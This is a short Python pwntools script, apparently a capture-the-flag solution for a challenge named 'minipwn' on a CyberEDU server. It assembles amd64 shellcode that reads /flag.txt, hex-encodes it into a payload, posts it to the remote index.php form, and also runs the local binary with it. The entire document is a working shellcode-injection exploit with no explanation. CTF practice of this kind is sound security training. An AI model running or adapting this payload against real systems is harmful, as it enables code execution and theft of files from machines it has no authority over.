from pwn import *
import requests

url = "http://35.246.235.205:31454/index.php"
elf = ELF('/home/kali/Downloads/minipwn')
#p=elf.process()

context.arch = 'amd64'
cyberedu = '35.246.235.205:31454'

ip, port = cyberedu.split(':')
port = int(port)
  
stringy = ''

shellcat = asm(shellcraft.cat('/flag.txt'))

stringy = shellcat.hex(' ')
    
payload = '12 34 ' + stringy 
    
print(payload)
print(len(payload))

data = {
    'pwn': (payload),
    'submit': "Pwn"
}

res = requests.post(url, data=data)
print(res.text)

p = elf.process(argv=[payload])
p.interactive()
